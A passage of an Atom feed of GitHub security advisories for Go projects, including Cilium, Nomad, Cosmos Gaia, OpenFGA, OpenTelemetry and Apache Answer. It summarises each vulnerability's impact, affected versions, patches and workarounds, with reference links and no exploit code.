<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-q7w8-72mr-vpgw">https://github.com/cilium/cilium/security/advisories/GHSA-q7w8-72mr-vpgw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42488">https://nvd.nist.gov/vuln/detail/CVE-2024-42488</a></li>
<li><a href="https://github.com/cilium/cilium/pull/33511">https://github.com/cilium/cilium/pull/33511</a></li>
<li><a href="https://github.com/cilium/cilium/commit/aa44dd148a9be95e07782e4f990e61678ef0abf8">https://github.com/cilium/cilium/commit/aa44dd148a9be95e07782e4f990e61678ef0abf8</a></li>
<li><a href="https://github.com/cilium/cilium/commit/7877db09b3f34d3081a1d66459b8fa6603dc3d30">https://github.com/cilium/cilium/commit/7877db09b3f34d3081a1d66459b8fa6603dc3d30</a></li>
<li><a href="https://github.com/cilium/cilium/commit/f81a1ee0cfdec928980db8640def984b2eeaa134">https://github.com/cilium/cilium/commit/f81a1ee0cfdec928980db8640def984b2eeaa134</a></li>
<li><a href="https://github.com/advisories/GHSA-q7w8-72mr-vpgw">https://github.com/advisories/GHSA-q7w8-72mr-vpgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7w8-72mr-vpgw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T21:43:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Policy bypass for Host Firewall policy due to race condition in Cilium agent]]></title>
        <id>https://github.com/advisories/GHSA-q7w8-72mr-vpgw</id>
        <link href="https://github.com/advisories/GHSA-q7w8-72mr-vpgw"/>
        <updated>2024-08-15T22:35:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A race condition in the Cilium agent can cause the agent to ignore labels that should be applied to a node. This could in turn cause CiliumClusterwideNetworkPolicies intended for nodes with the ignored label to not apply, leading to policy bypass.</p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <a href="https://github.com/cilium/cilium/pull/33511">https://github.com/cilium/cilium/pull/33511</a>.</p>
<p>This issue affects:</p>
<ul>
<li>All versions of Cilium before v1.14.14</li>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.14.14</li>
<li>Cilium v1.15.8</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>As the underlying issue depends on a race condition, users unable to upgrade can restart the Cilium agent on affected nodes until the affected policies are confirmed to be working as expected.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Google and Isovalent to prepare these mitigations. Special thanks to @skmatti for raising and resolving this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-q7w8-72mr-vpgw">https://github.com/cilium/cilium/security/advisories/GHSA-q7w8-72mr-vpgw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42488">https://nvd.nist.gov/vuln/detail/CVE-2024-42488</a></li>
<li><a href="https://github.com/cilium/cilium/pull/33511">https://github.com/cilium/cilium/pull/33511</a></li>
<li><a href="https://github.com/cilium/cilium/commit/aa44dd148a9be95e07782e4f990e61678ef0abf8">https://github.com/cilium/cilium/commit/aa44dd148a9be95e07782e4f990e61678ef0abf8</a></li>
<li><a href="https://github.com/cilium/cilium/commit/7877db09b3f34d3081a1d66459b8fa6603dc3d30">https://github.com/cilium/cilium/commit/7877db09b3f34d3081a1d66459b8fa6603dc3d30</a></li>
<li><a href="https://github.com/cilium/cilium/commit/f81a1ee0cfdec928980db8640def984b2eeaa134">https://github.com/cilium/cilium/commit/f81a1ee0cfdec928980db8640def984b2eeaa134</a></li>
<li><a href="https://github.com/advisories/GHSA-q7w8-72mr-vpgw">https://github.com/advisories/GHSA-q7w8-72mr-vpgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7w8-72mr-vpgw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T21:43:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Vulnerable to Allocation Directory Escape On Non-Existing File Paths Through Archive Unpacking]]></title>
        <id>https://github.com/advisories/GHSA-25qx-vfw2-fw8r</id>
        <link href="https://github.com/advisories/GHSA-25qx-vfw2-fw8r"/>
        <updated>2024-08-15T21:24:58.000Z</updated>
        <content type="html"><![CDATA[<p>In HashiCorp Nomad and Nomad Enterprise from 0.6.1 up to 1.16.13, 1.7.10, and 1.8.2, the archive unpacking process is vulnerable to writes outside the allocation directory during migration of allocation directories when multiple archive headers target the same file. This vulnerability, CVE-2024-7625, is fixed in Nomad 1.6.14, 1.7.11, and 1.8.3. Access or compromise of the Nomad client agent at the source allocation first is a prerequisite for leveraging this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7625">https://nvd.nist.gov/vuln/detail/CVE-2024-7625</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-17-nomad-vulnerable-to-allocation-directory-escape-on-non-existing-file-paths-through-archive-unpacking/69293">https://discuss.hashicorp.com/t/hcsec-2024-17-nomad-vulnerable-to-allocation-directory-escape-on-non-existing-file-paths-through-archive-unpacking/69293</a></li>
<li><a href="https://github.com/advisories/GHSA-25qx-vfw2-fw8r">https://github.com/advisories/GHSA-25qx-vfw2-fw8r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-25qx-vfw2-fw8r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T00:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Vulnerable to Allocation Directory Escape On Non-Existing File Paths Through Archive Unpacking]]></title>
        <id>https://github.com/advisories/GHSA-25qx-vfw2-fw8r</id>
        <link href="https://github.com/advisories/GHSA-25qx-vfw2-fw8r"/>
        <updated>2024-08-15T21:24:58.000Z</updated>
        <content type="html"><![CDATA[<p>In HashiCorp Nomad and Nomad Enterprise from 0.6.1 up to 1.16.13, 1.7.10, and 1.8.2, the archive unpacking process is vulnerable to writes outside the allocation directory during migration of allocation directories when multiple archive headers target the same file. This vulnerability, CVE-2024-7625, is fixed in Nomad 1.6.14, 1.7.11, and 1.8.3. Access or compromise of the Nomad client agent at the source allocation first is a prerequisite for leveraging this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7625">https://nvd.nist.gov/vuln/detail/CVE-2024-7625</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-17-nomad-vulnerable-to-allocation-directory-escape-on-non-existing-file-paths-through-archive-unpacking/69293">https://discuss.hashicorp.com/t/hcsec-2024-17-nomad-vulnerable-to-allocation-directory-escape-on-non-existing-file-paths-through-archive-unpacking/69293</a></li>
<li><a href="https://github.com/advisories/GHSA-25qx-vfw2-fw8r">https://github.com/advisories/GHSA-25qx-vfw2-fw8r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-25qx-vfw2-fw8r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T00:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Vulnerable to Allocation Directory Escape On Non-Existing File Paths Through Archive Unpacking]]></title>
        <id>https://github.com/advisories/GHSA-25qx-vfw2-fw8r</id>
        <link href="https://github.com/advisories/GHSA-25qx-vfw2-fw8r"/>
        <updated>2024-08-15T21:24:58.000Z</updated>
        <content type="html"><![CDATA[<p>In HashiCorp Nomad and Nomad Enterprise from 0.6.1 up to 1.16.13, 1.7.10, and 1.8.2, the archive unpacking process is vulnerable to writes outside the allocation directory during migration of allocation directories when multiple archive headers target the same file. This vulnerability, CVE-2024-7625, is fixed in Nomad 1.6.14, 1.7.11, and 1.8.3. Access or compromise of the Nomad client agent at the source allocation first is a prerequisite for leveraging this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7625">https://nvd.nist.gov/vuln/detail/CVE-2024-7625</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-17-nomad-vulnerable-to-allocation-directory-escape-on-non-existing-file-paths-through-archive-unpacking/69293">https://discuss.hashicorp.com/t/hcsec-2024-17-nomad-vulnerable-to-allocation-directory-escape-on-non-existing-file-paths-through-archive-unpacking/69293</a></li>
<li><a href="https://github.com/advisories/GHSA-25qx-vfw2-fw8r">https://github.com/advisories/GHSA-25qx-vfw2-fw8r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-25qx-vfw2-fw8r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T00:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/gaia] Cosmos Hub (Gaia): The check for the height of cryptographic equivocation evidence is missing]]></title>
        <id>https://github.com/advisories/GHSA-83qr-9v2h-qxp4</id>
        <link href="https://github.com/advisories/GHSA-83qr-9v2h-qxp4"/>
        <updated>2024-08-14T17:54:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An issue was identified in the Interchain Security (ICS) module that could result in the slashing of a validator for an "old" equivocation. The height-base filter for consumer equivocation evidence introduced in <a href="https://github.com/cosmos/interchain-security/releases/tag/v2.4.0-lsm">v2.4.0-lsm</a> was re-enabled. </p>
<h3 id="details">Details</h3>
<p>ICS <a href="https://github.com/cosmos/interchain-security/releases/tag/v2.4.0-lsm">v2.4.0-lsm</a> introduced a height-base filter for consumer equivocation evidence. This feature enables a provider to set per consumer chain minimum heights for which cryptographic evidence is considered valid. The Cosmos Hub <a href="https://github.com/cosmos/gaia/releases/tag/v14.1.0">v14 upgrade</a> bumped ICS to v2.4.0-lsm and also set the minimum evidence height for both <code>neutron-1</code> and <code>stride-1</code> consumer chains to their respective height at that time (see <a href="https://github.com/cosmos/gaia/pull/2821">PR</a>). As a result, "older" cryptographic evidence was no longer accepted by the Hub.</p>
<p>The Cosmos Hub <a href="https://github.com/cosmos/gaia/releases/tag/v15.1.0">v15 upgrade</a> bumped ICS to <a href="https://github.com/cosmos/interchain-security/releases/tag/v3.3.3-lsm">v3.3.3-lsm</a>, which had the height-base filter for consumer equivocation evidence disabled. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/gaia/security/advisories/GHSA-83qr-9v2h-qxp4">https://github.com/cosmos/gaia/security/advisories/GHSA-83qr-9v2h-qxp4</a></li>
<li><a href="https://github.com/advisories/GHSA-83qr-9v2h-qxp4">https://github.com/advisories/GHSA-83qr-9v2h-qxp4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83qr-9v2h-qxp4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-14T17:54:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openfga/openfga] OpenFGA Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-3f6g-m4hr-59h8</id>
        <link href="https://github.com/advisories/GHSA-3f6g-m4hr-59h8"/>
        <updated>2024-08-14T17:18:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>OpenFGA v1.5.7 and v1.5.8 are vulnerable to authorization bypass when calling Check API with a model that uses <code>but not</code> and <code>from</code> expressions and a userset. </p>
<h2 id="fix">Fix</h2>
<ul>
<li>If you are using OpenFGA within Docker or as a Go library, as a binary, or through Docker, upgrade to v1.5.9 as soon as possible</li>
<li>If using Helm chart, upgrade to 0.2.12 as soon as possible.</li>
</ul>
<p>This fix is backward compatible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openfga/openfga/security/advisories/GHSA-3f6g-m4hr-59h8">https://github.com/openfga/openfga/security/advisories/GHSA-3f6g-m4hr-59h8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42473">https://nvd.nist.gov/vuln/detail/CVE-2024-42473</a></li>
<li><a href="https://github.com/advisories/GHSA-3f6g-m4hr-59h8">https://github.com/advisories/GHSA-3f6g-m4hr-59h8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f6g-m4hr-59h8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-09T21:23:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/open-telemetry/opentelemetry-collector-contrib/extension/bearertokenauthextension] open-telemetry has an Observable Timing Discrepancy]]></title>
        <id>https://github.com/advisories/GHSA-rfxf-mf63-cpqv</id>
        <link href="https://github.com/advisories/GHSA-rfxf-mf63-cpqv"/>
        <updated>2024-08-13T21:57:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The bearertokenauth extension's server authenticator performs a simple, non-constant time string comparison of the received &amp; configured bearer tokens.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/9128a9258fe1fee36f198f97b1e3371fc7b77a93/extension/bearertokenauthextension/bearertokenauth.go#L189-L196">https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/9128a9258fe1fee36f198f97b1e3371fc7b77a93/extension/bearertokenauthextension/bearertokenauth.go#L189-L196</a></p>
<p>For background on the type of vulnerability, see <a href="https://ropesec.com/articles/timing-attacks/">https://ropesec.com/articles/timing-attacks/</a>.</p>
<h3 id="impact">Impact</h3>
<p>This impacts anyone using the <code>bearertokenauth</code> server authenticator. Malicious clients with network access to the collector may perform a timing attack against a collector with this authenticator to guess the configured token, by iteratively sending tokens and comparing the response time. This would allow an attacker to introduce fabricated or bad data into the collector's telemetry pipeline.</p>
<h3 id="fix">Fix</h3>
<p>The observable timing vulnerability was fixed by @axw in v0.107.0 (PR <a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34516">https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34516</a>) by using constant-time comparison.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>upgrade to v0.107.0 or above, or, if you're unable to upgrade at this time,</li>
<li>don't expose the receiver using <code>bearertokenauth</code> to network segments accessible by potential attackers, or</li>
<li>change the receiver to use a different authentication extension instead, or</li>
<li>disable the receiver relying on <code>bearertokenauth</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-rfxf-mf63-cpqv">https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-rfxf-mf63-cpqv</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34516">https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34516</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/c9bd3eff0bb357d9c812a0d8defd3b09db95699a">https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/c9bd3eff0bb357d9c812a0d8defd3b09db95699a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42368">https://nvd.nist.gov/vuln/detail/CVE-2024-42368</a></li>
<li><a href="https://github.com/advisories/GHSA-rfxf-mf63-cpqv">https://github.com/advisories/GHSA-rfxf-mf63-cpqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfxf-mf63-cpqv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-13T18:59:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer: The link for resetting user password is not Single-Use]]></title>
        <id>https://github.com/advisories/GHSA-v3x9-wrq5-868j</id>
        <link href="https://github.com/advisories/GHSA-v3x9-wrq5-868j"/>
        <updated>2024-08-14T17:16:22.000Z</updated>
        <content type="html"><![CDATA[<p>Missing Release of Resource after Effective Lifetime vulnerability in Apache Answer.</p>
<p>This issue affects Apache Answer: through 1.3.5.</p>
<p>The password reset link remains valid within its expiration period even after it has been used. This could potentially lead to the link being misused or hijacked.
Users are recommended to upgrade to version 1.3.6, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41888">https://nvd.nist.gov/vuln/detail/CVE-2024-41888</a></li>
<li><a href="https://lists.apache.org/thread/jbs1j2o9rqm5sc19jyk3jcfvkmfkmyf4">https://lists.apache.org/thread/jbs1j2o9rqm5sc19jyk3jcfvkmfkmyf4</a></li>
<li><a href="https://github.com/apache/incubator-answer/commit/2820efc454f5808974dce0aa99aac106be3f727b">https://github.com/apache/incubator-answer/commit/2820efc454f5808974dce0aa99aac106be3f727b</a></li>
<li><a href="https://github.com/advisories/GHSA-v3x9-wrq5-868j">https://github.com/advisories/GHSA-v3x9-wrq5-868j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3x9-wrq5-868j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-12T15:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer: The link to reset the user's password will remain valid after sending a new link]]></title>
        <id>https://github.com/advisories/GHSA-gvpv-r32v-9737</id>
        <link href="https://github.com/advisories/GHSA-gvpv-r32v-9737"/>
        <updated>2024-08-14T17:16:42.000Z</updated>
        <content type="html"><![CDATA[<p>Missing Release of Resource after Effective Lifetime vulnerability in Apache Answer.</p>
<p>This issue affects Apache Answer: through 1.3.5.</p>
<p>User sends multiple password reset emails, each containing a valid link. Within the link's validity period, this could potentially lead to the link being misused or hijacked.
Users are recommended to upgrade to version 1.3.6, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41890">https://nvd.nist.gov/vuln/detail/CVE-2024-41890</a></li>
<li><a href="https://lists.apache.org/thread/j7c080xj31x8rvz1pyk2h47rdd9pwbv9">https://lists.apache.org/thread/j7c080xj31x8rvz1pyk2h47rdd9pwbv9</a></li>
<li><a href="https://github.com/apache/incubator-answer/commit/2820efc454f5808974dce0aa99aac106be3f727b">https://github.com/apache/incubator-answer/commit/2820efc454f5808974dce0aa99aac106be3f727b</a></li>
<li><a href="https://github.com/advisories/GHSA-gvpv-r32v-9737">https://github.com/advisories/GHSA-gvpv-r32v-9737</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gvpv-r32v-9737</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-12T15:30:50.000Z</published>
    </entry>
</feed>